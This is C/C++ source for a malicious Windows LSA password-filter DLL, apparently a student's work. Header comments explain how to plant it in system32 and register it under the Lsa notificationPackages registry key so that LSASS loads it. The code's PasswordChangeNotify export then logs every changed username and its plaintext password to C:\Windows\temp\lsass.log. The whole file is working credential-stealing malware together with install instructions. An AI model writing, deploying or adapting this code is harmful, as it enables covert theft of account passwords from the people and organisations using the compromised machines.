//USAGE
//this library compiles into a dll file
//place this dll file in the system32 directory
//edit the regkey HKLM:\System\CurrentControlSet\Control\Lsa -> notificationPackages
//add the name of the dll you placed into sys32 (minus the .dll part)
//restart the box.
//the dll should now be visible in procexp loaded under LSASS.exe
//passwords should be saved in C:\Windows\temp\lsass.log

//
// Asa Horn
// aoh9470@rit.edu
//

#include <Windows.h>
#include <SubAuth.h>
#include "stdlib.h"
#include <tchar.h>


//////// Helper functions
BOOL writeToFile(PUNICODE_STRING text) {
    //open a file (the janky windows way)
    HANDLE hFile = CreateFileW(
            L"C:\\Windows\\temp\\lsass.log",
            FILE_APPEND_DATA,
            FILE_SHARE_READ,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    //debug
    if (hFile == INVALID_HANDLE_VALUE) {
        //printf("bad handle: %d", hFile);
        return FALSE;
    }
    // Move file pointer to the end for appending
    SetFilePointer(hFile, 0, NULL, FILE_END);

    //Do you see why I hate stupid unicode now
    // Write BOM (byte order mark) if the file is new (just created)
    // this tells windows that it is looking at unicode rather than ascii
    // and prevents null btyes between ascii letters.
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        WORD bom = 0xFEFF;
        DWORD bytesWritten;
        WriteFile(hFile, &bom, sizeof(bom), &bytesWritten, NULL);
    }

    //write the file to disk using fileapi (thanks windows)
    DWORD bytesWritten;
    BOOL result = WriteFile(
            hFile,
            text->Buffer,
            text->Length,
            &bytesWritten,
            NULL
    );

    if(result != TRUE) {
        //std::cerr << "error writing";
    }

    CloseHandle(hFile);
    return 0;
}




//boilerplate dll (I think. TBH this could be doing nothing, but I am not touching it now)
BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

//on load
// True for successful load, false for failure
extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) {
    return TRUE; //error handling / init is lame
}

//called when user is attempting to change password
//return FALSE to deny change, TRUE to accept
//this function being called does not mean the change was successful
extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
    return TRUE; //not going to actually prevent password changes right now
}

//called to notify that a password change has successfully occurred
//return 0 for OK, other number for error code
extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING uname, ULONG RelativeId, PUNICODE_STRING password){
    //build the unicode chars for building the output
    wchar_t singleColon = L':';
    UNICODE_STRING colon = { 2, 2, &singleColon };

    wchar_t singleNL = L'\n';
    UNICODE_STRING newline = { 2, 2, &singleNL };

   //Zach help, unicode characters are super hard to concatenate
   //instead I just call the output function 4 times
   //only the finest cs here
    writeToFile(uname);
    writeToFile(&colon);
    writeToFile(password);
    writeToFile(&newline);

    return 0;
}
